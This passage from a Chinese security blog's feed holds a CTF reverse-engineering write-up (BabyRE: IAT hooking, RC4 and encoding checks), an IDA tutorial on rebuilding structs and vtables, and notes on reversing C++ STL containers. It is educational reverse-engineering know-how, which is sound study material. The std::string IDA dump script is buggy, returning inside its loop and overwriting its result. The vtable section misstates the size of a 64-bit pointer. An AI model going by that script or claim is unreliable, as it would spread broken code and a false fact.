class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; p*(t-p<span class="number">-1</span>)==s.<span class="built_in">size</span>()-t<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这题本来是要计算字符A位置上数量约束，一个map就巧妙解决了所有约束太妙了。</p><p>申明：此题主要看柳神解答，非本人独创</p><p>参考链接：<a href="https://www.liuchuo.net/archives/460">1003. 我要通过！(20)-PAT乙级真题 – 柳婼 の blog (liuchuo.net)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;PAT_basic 	C++ map1&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>西湖论剑wp</title>
    <link href="https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/"/>
    <id>https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</id>
    <published>2023-02-15T02:06:30.000Z</published>
    <updated>2023-05-07T12:03:57.090Z</updated>
    
    <content type="html"><![CDATA[<p>西湖论剑wp</p><span id="more"></span><h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>给数组中的每一个函数都设置断点</p><p>开始动调，第一个函数，给输入的值进行检验是否是数字<img data-src="/./../images/image-20230215100917313.png" alt="image-20230215100917313"></p><p>第二个函数进行按位取反<img data-src="/./../images/image-20230215101120897.png" alt="image-20230215101120897"></p><p>取反后的结果<img data-src="/./../images/image-20230215101335001.png" alt="image-20230215101335001"></p><p>下个函数是IAT hook .替换GetLastError函数 替换为sub_4019D0函数<img data-src="/./../images/image-20230215101601229.png" alt="image-20230215101601229"></p><p>GetModuleHandle函数：获取一个应用程序或动态链接库的模块句柄 </p><p>GetModuleHandleA(0);返回0x00400000，而<em><strong>*模块句柄实际上就是模块在当前进程空间的装入地址。exe程序装入句柄一般为 0x00400000 。所以GetModuleHandle(NULL); 返回的值为 0x00400000；GetModuleHandle(“kernel32”)；返回值是0x7c800000(这个值正是kernel32.dll中的Image base的值)。*</strong></em></p><p>这里lpModuleName为kernel32<img data-src="/./../images/image-20230215111115149.png" alt="image-20230215111115149"></p><p>然后在kernel32模块中找GetLastError函数地址再将其替换这就是hook IAT的过程：先从程序句柄0x00400000中找kernel32.dll再从kernel32中找getlasterror。刚好两个循环</p><p>这里双击也可以查看<img data-src="/./../images/image-20230215111553991.png" alt="image-20230215111553991"></p><p><img data-src="/./../images/image-20230215111607580.png" alt="image-20230215111607580"></p><p>再给替换的函数加上断点<img data-src="/./../images/image-20230215101638875.png" alt="image-20230215101638875"></p><p>注意dword_4085C0是IAT之后的GetLastError函数</p><p>下一个函数是替换dword_408148的值<img data-src="/./../images/image-20230215101915168.png" alt="image-20230215101915168"></p><p>C 库函数 <strong>int atexit(void (*func)(void))</strong> 当程序正常终止时，调用指定的函数 <strong>func</strong>。您可以在任何地方注册你的终止函数，但它会在程序终止的时候被调用。<strong>func</strong> – 在程序终止时被调用的函数。</p><p>如果有多处atexit那么执行顺序是什么呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionA</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数A\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionB</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数B\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionC</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数C\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/* 注册终止函数 */</span></span><br><span class="line">   atexit(functionA );</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;启动主程序...\n&quot;</span>);</span><br><span class="line">   atexit(functionC );</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;退出主程序...\n&quot;</span>);</span><br><span class="line">   atexit(functionB );</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230215105209445.png" alt="image-20230215105209445"></p><p>可以看出来多出atexit是以栈的执行顺序调用的</p><p>所以总结一下执行顺序</p><ol><li>sub_401170 输入检验 -&gt; </li><li>sub_401230 对某一内存数据进行按位取反</li><li>sub_4012B0 IAT hook 替换GetLastError函数 替换为sub_4019D0函数</li><li>main sub_4019D0 dword_408148, “dcbahgfelkjiponm”</li><li>sub_401670 base8 加密后memcmp(&amp;unk_4081D0, a16230465152334, 0x60u);</li><li>sub_4015C0 sub_401CC0加密后memcmp(Buffer, a67339fc92b4875, 0x28u);</li><li>sub_4014E0 执行RC4，后比较密文memcmp(&amp;unk_4084C0, &amp;unk_408090, 0x70u) )</li></ol><p>ebpf程序：eBPF 于 2015 年推出，是 <strong>Linux 的 一项 功能，可以直接在 Linux 内核中运行程序</strong>，而不是在无法直接访问内核资源的“用户空间”中运行程序。 eBPF 源于 BPF，本质上是处于内核中的一个高效与灵活的虚类虚拟机组件，以一种安全的方式在许多内核 Hook 点执行字节码。</p><p>资料链接：</p><ul><li><a href="https://blog.csdn.net/Rong_Toa/article/details/120250788">(61条消息) eBPF 入门之编程_rtoax的博客-CSDN博客_ebpf程序</a></li><li><a href="https://blog.csdn.net/melody157398/article/details/113409274">(61条消息) eBPF在android上的使用_布道师Peter的博客-CSDN博客</a></li></ul><p>VT是什么意思？</p><p>VT，全称是，Virtualization Technology，即是虚拟化技术，虚拟化技术可以扩大硬件的容量，简化软件的重新配置过程。<a href="https://product.pconline.com.cn/cpu/">CPU</a>的虚拟化技术可以单CPU模拟多CPU并行，允许一个平台同时运行多个操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。</p><p>VT实现：<a href="https://www.cnblogs.com/wingsummer/p/15971289.html">VT 入门番外篇——最小 VT 实现 - 寂静的羽夏 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;西湖论剑wp&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA结构体分析</title>
    <link href="https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/"/>
    <id>https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/</id>
    <published>2023-01-21T01:52:17.000Z</published>
    <updated>2023-01-22T13:48:54.654Z</updated>
    
    <content type="html"><![CDATA[<p>IDA 类型修复</p><span id="more"></span><p>源码编译成二进制代码的过程中，大量辅助信息被删除，其中最重要的就是类型信息</p><p>为什么要修复伪代码中的类型？</p><ul><li>提高伪代码的准确度</li><li>指导 IDA 反编译器中的优化器使用正确的优化方案</li><li>让 IDA 生成的伪代码更接近源码</li></ul><p>我们需要手动修复哪些类型？</p><ul><li>函数返回值类型</li><li>参数类型 &#x2F; 局部变量类型 &#x2F; 全局变量类型</li><li>数组类型 &#x2F; 数组大小</li><li>结构体类型</li><li>虚表类型</li></ul><p>IDA 数组修复主要有两种：</p><p>1.局部变量中定义的数组</p><p>2.全局变量中定义的数组</p><p>数组修复要考虑：数据类型 + 数组大小</p><h2 id="IDA-修复枚举值"><a href="#IDA-修复枚举值" class="headerlink" title="IDA 修复枚举值"></a>IDA 修复枚举值</h2><p>实验材料：ptrace1</p><p>IDA 的类型数据库内置了常见的枚举（宏）的值，可以直接引入并修复。</p><p>通过逆向分析，ptrace函数</p><p><img data-src="/./../images/image-20230121101355025.png" alt="image-20230121101355025"></p><p>第一个参数就是ptrace函数的功能号</p><p>鼠标锁定摁M键导入枚举值</p><p>Ctrl+F5搜索ptrace关键字</p><p><img data-src="/./../images/image-20230121101528976.png" alt="image-20230121101528976"></p><p>找到后双击即可</p><p><img data-src="/./../images/image-20230121101553907.png" alt="image-20230121101553907"></p><p>下图就全部修复完成了</p><p><img data-src="/./../images/image-20230121101813329.png" alt="image-20230121101813329"></p><h2 id="IDA-结构体修复"><a href="#IDA-结构体修复" class="headerlink" title="IDA 结构体修复"></a>IDA 结构体修复</h2><p>实验材料：monopoly</p><p>这是一个大富翁游戏！</p><p>确定结构体大小：</p><ul><li>内存分配可以直接确定结构体大小</li><li>memcpy &#x2F; 局部变量偏移差 -&gt; 间接确定 （结构体&#x2F;类局部变量） 这种大多是在栈上</li></ul><p><img data-src="/./../images/image-20230121104326617.png" alt="image-20230121104326617"></p><p>创建相等大小匿名结构体，并将相关变量、参数的类型修改为该结构体</p><p>这里看见这个0x70的new函数，直接在struct视图下创建结构体</p><p><img data-src="/./../images/image-20230121105019521.png" alt="image-20230121105019521"></p><p>快捷键是Shift + F9，打开struct视图</p><p>这里在struct视图下，右键点击增加结构体类型</p><p><img data-src="/./../images/image-20230121105406208.png" alt="image-20230121105406208"></p><p>这里可以看见结构体大小</p><p><img data-src="/./../images/image-20230121105556782.png" alt="image-20230121105556782"></p><p>鼠标光标在ends处，增加属性（大小）：摁d键</p><p><img data-src="/./../images/image-20230121105718374.png" alt="image-20230121105718374"></p><p>这里直到sizeof显示为0x70为止，每个属性先以dq为单位，进行存储，后续再逆向分析再进行变更</p><p>这样结构体就初步设置完成了</p><p><img data-src="/./../images/image-20230121110056164.png" alt="image-20230121110056164"></p><p>这里回到代码处，这里将v0的类型修改为，刚刚我们创建的结构体类型</p><p><img data-src="/./../images/image-20230121110310274.png" alt="image-20230121110310274"></p><p>第一种改法：摁Y键，进行类型修改为struc_1 *类型</p><p>第二种改法：摁右键，转化为其他结构体：</p><p><img data-src="/./../images/image-20230121110552200.png" alt="image-20230121110552200"></p><p>这里直接选择我们刚刚创建的类型即可</p><p><img data-src="/./../images/image-20230121110626662.png" alt="image-20230121110626662"></p><p>这里创建好之后，执行下面的函数，我们跟进去看看</p><p><img data-src="/./../images/image-20230121120704877.png" alt="image-20230121120704877"></p><p>这里的a1进行了一系列操作，我们将a1的类修修改为我们定义的类型<img data-src="/./../images/image-20230121120850500.png" alt="image-20230121120850500"></p><p>因为这个函数在new之后执行，所以可能是构造函数，这里我们改个函数名吧<img data-src="/./../images/image-20230121121052464.png" alt="image-20230121121052464"></p><p>在构造函数中，有些属性是进行dword操作，这里我们就要将qword，改成dword类型<img data-src="/./../images/image-20230121121546769.png" alt="image-20230121121546769"></p><p>比如field_48，这里双击field_48进入结构体定义处，将该属性改成dword，这里摁d键<img data-src="/./../images/image-20230121121758509.png" alt="image-20230121121758509"></p><p>设置好之后下面未定义的也需要改成dword，就像这样<img data-src="/./../images/image-20230121121852483.png" alt="image-20230121121852483"></p><p>其他变量也是一样修改，把剩下的也修改了，但是当最后一个属性改为dword后，总大小发生了改变，这里我们只需要在下面再增加一个变量即可<img data-src="/./../images/image-20230121122116991.png" alt="image-20230121122116991"></p><p>最后就是这样<img data-src="/./../images/image-20230121122144895.png" alt="image-20230121122144895"></p><p>然后在源码中摁F5，代码就好看多了<img data-src="/./../images/image-20230121122453040.png" alt="image-20230121122453040"></p><p>上面循环处field_4c是以4字节进行访问，并且访问5词，也就是说field_4c开始处是一个以4字节为单位的一个数组，数组大小为5，在结构体定义处，右键点array设置数组，大小为5<img data-src="/./../images/image-20230121122734380.png" alt="image-20230121122734380"></p><p>最终field_4c后面的变量也将合并进入数组中<img data-src="/./../images/image-20230121122825156.png" alt="image-20230121122825156"></p><p>源码舒服，重命名为array1<img data-src="/./../images/image-20230121123416130.png" alt="image-20230121123416130"></p><p>这里进行字符串的初始化和赋值操作<img data-src="/./../images/image-20230121123758528.png" alt="image-20230121123758528"></p><p>这里我们将field_20改为str1</p><p>根据大富翁游戏，初始化的字符串，根据名字都是一些建筑，我们可以把定义的结构体名称改成house，然后将构造函数改成init_house<img data-src="/./../images/image-20230121124542969.png" alt="image-20230121124542969"></p><p>然后经过构造函数，申请到的对象内存都会存放到，以A1C0为首的地址处<img data-src="/./../images/image-20230121125509200.png" alt="image-20230121125509200"></p><p><img data-src="/./../images/image-20230121125527179.png" alt="image-20230121125527179"></p><p>上面一共64个位置，所以类型为house *为类型，数组长度为64个来存放house对象的指针<img data-src="/./../images/image-20230121125756372.png" alt="image-20230121125756372"></p><p>这里再右键array改为64<img data-src="/./../images/image-20230121125834301.png" alt="image-20230121125834301"></p><p>这些建筑正好形成地图，将数组名改成map即可<img data-src="/./../images/image-20230121130116722.png" alt="image-20230121130116722"></p><p>分析另外一个结构体，这个结构体没有使用 new &#x2F; malloc 分配内存，如何确定大小？<img data-src="/./../images/image-20230121132813993.png" alt="image-20230121132813993"></p><p>进入函数，看起来明显是个初始化函数<img data-src="/./../images/image-20230121132852076.png" alt="image-20230121132852076"></p><p>两个变量都是紧挨着的在内存中，属于静态分配了<img data-src="/./../images/image-20230121132938102.png" alt="image-20230121132938102"></p><p>两个变量位置相减为0x80，所以我们就暂时确定这个结构体的大小为0x80，然后我就去struct视图中去创建一个大小为0x80的结构体，还是老操作<img data-src="/./../images/image-20230121133259989.png" alt="image-20230121133259989"></p><p>这里其实可以先创建64长度的数组，然后再取消定义，这样就可以快速创建结构体了</p><p>类型定义好之后，函数外的全局变量类型不急着更改，先更改函数形参的类型<img data-src="/./../images/image-20230122155016716.png" alt="image-20230122155016716"></p><p>在函数中判断feild_20可能是个数组，这里先不理会</p><p>后面函数形参类型也需要一个个去修改<img data-src="/./../images/image-20230122155424970.png" alt="image-20230122155424970"></p><p>刷新一下变成这样了，给变量改个名<img data-src="/./../images/image-20230122182413118.png" alt="image-20230122182413118"></p><p>把剩余需要修改的变量大小继续更改<img data-src="/./../images/image-20230122183001258.png" alt="image-20230122183001258"></p><p>然后这里根据printf的字符串信息来判断结构体的类型<img data-src="/./../images/image-20230122183705595.png" alt="image-20230122183705595"></p><p>v6可能是建筑的类型，从map数组中取出来的结构体都是house类型了，然后把变量名都改成自己猜想的名字。</p><p>这个函数的实参是map数组元素，形参应该改为house结构体指针<img data-src="/./../images/image-20230122185813240.png" alt="image-20230122185813240"></p><p>这里有个field_40,不能确定是啥<img data-src="/./../images/image-20230122190051439.png" alt="image-20230122190051439"></p><p>我们可以用交叉引用，去别的地方找信息，刚好这里有一处<img data-src="/./../images/image-20230122190406178.png" alt="image-20230122190406178"></p><p>这里将ppp1赋给field_40，所以我们就将field_40改成结构体2类型</p><p>以上就是随意逆向的结果，真正正经逆向都是要分析程序逻辑的，我们先随意逆向，分析部分属性信息，有助于我们之后的分析</p><p>程序刚开始会让我们输入游戏难度等级<img data-src="/./../images/image-20230122191713348.png" alt="image-20230122191713348"></p><p>经过分析这个就是获取数字的函数<img data-src="/./../images/image-20230122191835438.png" alt="image-20230122191835438"></p><p>然后我们先从简单的easy_level开始<img data-src="/./../images/image-20230122192539523.png" alt="image-20230122192539523"></p><p>从这分析出ppp3是玩家的意思，因为刚开始它就给ppp3给到初始的金额了<img data-src="/./../images/image-20230122192843765.png" alt="image-20230122192843765"></p><p>然后进入一个循环，首先进入这个函数<img data-src="/./../images/image-20230122193721525.png" alt="image-20230122193721525"></p><p>这个函数很明显是个循环<img data-src="/./../images/image-20230122193909583.png" alt="image-20230122193909583"></p><p>有两个函数，一个只有player1另外还有player2，也就是一个人玩玩，另一个人玩<img data-src="/./../images/image-20230122195530524.png" alt="image-20230122195530524"><img data-src="/./../images/image-20230122195544442.png" alt="image-20230122195544442"></p><p>然后这里我们需要输入我们想做的内容<img data-src="/./../images/image-20230122202153532.png" alt="image-20230122202153532"></p><p>我们先以第一个，这里有个比较，应该是玩家资产数量<img data-src="/./../images/image-20230122202349924.png" alt="image-20230122202349924"></p><p>要求输入的值不能超过，玩家拥有的资产的数量。所以sub_452F函数估计就是资产的售卖了</p><p>这里售卖的函数中<img data-src="/./../images/image-20230122203152235.png" alt="image-20230122203152235"></p><p>这里资产数组大小为map的总个数为64个<img data-src="/./../images/image-20230122203328139.png" alt="image-20230122203328139"></p><p>然后是3，购买资产<img data-src="/./../images/image-20230122210502911.png" alt="image-20230122210502911"></p><p>分析得<img data-src="/./../images/image-20230122210702534.png" alt="image-20230122210702534"></p><p>最终：<img data-src="/./../images/image-20230122210742758.png" alt="image-20230122210742758"></p><p><img data-src="/./../images/image-20230122210913452.png" alt="image-20230122210913452"></p><p>全局字段交叉引用 Ctrl + alt + X （要尽可能将相关函数找出来并修复类型，有利于查找）</p><h2 id="IDA-虚表修复"><a href="#IDA-虚表修复" class="headerlink" title="IDA 虚表修复"></a>IDA 虚表修复</h2><p>实验材料： vtable</p><p>虚表就是C++实现多态的一种机制</p><p>为了实现C++的多态，C++使用了一种动态绑定的技术。这个技术的核心是虚函数表，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权。所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表。我们来看以下的代码。类A包含虚函数vfunc1，vfunc2，由于类A包含虚函数，故类A拥有一个虚表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>类A的虚表如图1所示:<img data-src="/./../images/image-20230122212103043.png" alt="image-20230122212103043"></p><p>虚表是一个指针数组，其元素是虚函数的指针，每个元素对应一个虚函数的函数指针。需要指出的是，普通的函数即非虚函数，其调用并不需要经过虚表，所以虚表的元素并不包括普通函数的函数指针。虚表内的条目，即虚函数指针的赋值发生在编译器的编译阶段，也就是说在代码的编译阶段，虚表就可以构造出来了</p><p>虚表修复主要是为了重建虚表交叉引用,一般类的第一个地址就是虚表的地址。</p><p>这里就是调用虚表的某一个函数<img data-src="/./../images/image-20230122213810302.png" alt="image-20230122213810302"></p><p>这里类大小为0x28字节<img data-src="/./../images/image-20230122213834372.png" alt="image-20230122213834372"></p><p>这里我们找到虚表，点击这个就是虚表<img data-src="/./../images/image-20230122213906848.png" alt="image-20230122213906848"></p><p>然后右边是虚表的符号<img data-src="/./../images/image-20230122213950337.png" alt="image-20230122213950337"></p><p>这里先进行构建结构体，在结构体中表示虚表，一个函数地址，在64位中为32位<img data-src="/./../images/image-20230122214250424.png" alt="image-20230122214250424"></p><p>创建好后，创建类结构体，然后将类结构体的第一个属性类型设置为虚表类型<img data-src="/./../images/image-20230122214426259.png" alt="image-20230122214426259"></p><p>然后将v3的类型设置为类结构体类型<img data-src="/./../images/image-20230122214509446.png" alt="image-20230122214509446"></p><p>然后就修复完成了<img data-src="/./../images/image-20230122214621630.png" alt="image-20230122214621630"></p><p><img data-src="/./../images/image-20230122214835711.png" alt="image-20230122214835711"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;IDA 类型修复&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>STL逆向</title>
    <link href="https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/"/>
    <id>https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/</id>
    <published>2023-01-20T12:03:08.000Z</published>
    <updated>2023-01-20T12:47:25.636Z</updated>
    
    <content type="html"><![CDATA[<p>c++ STL</p><span id="more"></span><h1 id="STL-逆向方法论"><a href="#STL-逆向方法论" class="headerlink" title="STL 逆向方法论"></a>STL 逆向方法论</h1><ul><li>识别 STL 容器类型</li><li>识别 STL 容器操作</li><li>提取 STL 容器中的数据</li></ul><p><strong>逆向 STL 主要的问题:</strong></p><ol><li>缺少符号，无法判断 STL 容器类型 （主要困难）</li><li>STL 内部数据结构复杂，难以提取数据</li><li>优化使大量 stl 函数被 inline</li></ol><p>方法：解析 STL 容器内存数据，从内存数据角度判断容器类型，提取容器内容判断函数操作。</p><h2 id="常见-STL-容器"><a href="#常见-STL-容器" class="headerlink" title="常见 STL 容器"></a>常见 STL 容器</h2><p>序列容器</p><ul><li>vector</li><li>Deque</li><li>List</li><li>String</li></ul><p>关联容器</p><ul><li>Pair</li><li>Map</li><li>Set</li><li>MultiMap &#x2F; MultiSet</li></ul><p>无序关联容器:unordered_map</p><h1 id="C-STL关联式容器是什么？"><a href="#C-STL关联式容器是什么？" class="headerlink" title="C++ STL关联式容器是什么？"></a>C++ STL关联式容器是什么？</h1><p>此类容器在存储元素值的同时，还会为各元素额外再配备一个值（又称为“键”，其本质也是一个 C++ 基础数据类型或自定义类型的元素），它的功能是在使用关联式容器的过程中，如果已知目标元素的键的值，则直接通过该键就可以找到目标元素，而无需再通过遍历整个容器的方式。</p><p>弃用序列式容器，转而选用关联式容器存储元素，往往就是看中了关联式容器可以快速查找、读取或者删除所存储的元素，同时该类型容器插入元素的效率也比序列式容器高。</p><h1 id="常见-STL-容器适配器"><a href="#常见-STL-容器适配器" class="headerlink" title="常见 STL 容器适配器"></a>常见 STL 容器适配器</h1><p><strong>容器适配器</strong>是一个封装了序列容器的类模板，它在一般序列容器的基础上提供了一些不同的功能。之所以称作适配器类，是因为它可以通过适配容器现有的接口来提供不同的功能。</p><p>其实，容器适配器中的“适配器”，和生活中常见的电源适配器中“适配器”的含义非常接近。我们知道，无论是电脑、手机还是其它电器，充电时都无法直接使用 220V 的交流电，为了方便用户使用，各个电器厂商都会提供一个适用于自己产品的电源线，它可以将 220V 的交流电转换成适合电器使用的低压直流电。</p><p>从用户的角度看，电源线扮演的角色就是将原本不适用的交流电变得适用，因此其又被称为电源适配器。</p><p>举一个例子，假设一个代码模块 A，它的构成如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f1</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f2</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f3</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f4</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们需要设计一个模板 B，但发现，其实只需要组合一下模块 A 中的 f1()、f2()、f3()，就可以实现模板 B 需要的功能。其中 f1() 单独使用即可，而 f2() 和 f3() 需要组合起来使用，如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    A * a;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">g1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a-&gt;<span class="built_in">f1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">g2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a-&gt;<span class="built_in">f2</span>();</span><br><span class="line">        a-&gt;<span class="built_in">f3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，就如同是电源适配器将不适用的交流电变得适用一样，模板 B 将不适合直接拿来用的模板 A 变得适用了，因此我们可以将模板 B 称为 B 适配器.</p><p>容器适配器也是同样的道理，<em>简单的理解容器适配器，其就是将不适用的序列式容器（包括 vector、deque 和 list）变得适用</em>。容器适配器的底层实现和模板 A、B 的关系是完全相同的，即通过封装某个序列式容器，并重新组合该容器中包含的成员函数，使其满足某些特定场景的需要。</p><p>stack（STL stack）容器适配器:采用默认的 deque 基础容器</p><p>queue容器适配器:其底层使用的基础容器选择默认的 deque 容器</p><p>priority_queue ：vector</p><p>逆向时处理容器适配器只需要用底层容器来处理即可</p><h1 id="STL-各高级类型dump数据"><a href="#STL-各高级类型dump数据" class="headerlink" title="STL 各高级类型dump数据"></a>STL 各高级类型dump数据</h1><h2 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h2><ul><li>固定长度 32 字节，4 个 dq</li><li>第一个指针字段指向数据地址</li><li>第二个 size_t 字段存储字符串长度</li></ul><p>内存分布：</p><p><img data-src="/./../images/image-20230120202731025.png" alt="image-20230120202731025"></p><p>IDA dump脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_dbg_cppstr_64</span>(<span class="params">objectAddr</span>):</span><br><span class="line">    <span class="comment"># a easy function for read std:string</span></span><br><span class="line">    <span class="comment"># 首地址就是begin指针</span></span><br><span class="line">    strPtr = idc.read_dbg_qword(objectAddr)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        onebyte = idc.read_dbg_byte(strPtr + i)</span><br><span class="line">        <span class="keyword">if</span> onebyte == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="built_in">chr</span>(onebyte)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="std-stringsteam"><a href="#std-stringsteam" class="headerlink" title="std::stringsteam"></a>std::stringsteam</h2><p>可以看作是读写文件</p><p>内存分布：<img data-src="/./../images/image-20230120203121252.png" alt="image-20230120203121252"></p><p><img data-src="/./../images/image-20230120203135198.png" alt="image-20230120203135198"></p><h2 id="std-vector"><a href="#std-vector" class="headerlink" title="std::vector"></a>std::vector</h2><ul><li>固定长度 24 字节，3 个 dq</li><li>第一个指针字段指向数组起始地址</li><li>第二个指针字段指向数组最后元素地址</li><li>第三个指针字段指向最大内存地址</li></ul><p>内存分布：<img data-src="/./../images/image-20230120203330744.png" alt="image-20230120203330744"></p><p>IDA dump脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vetor_dump</span>(<span 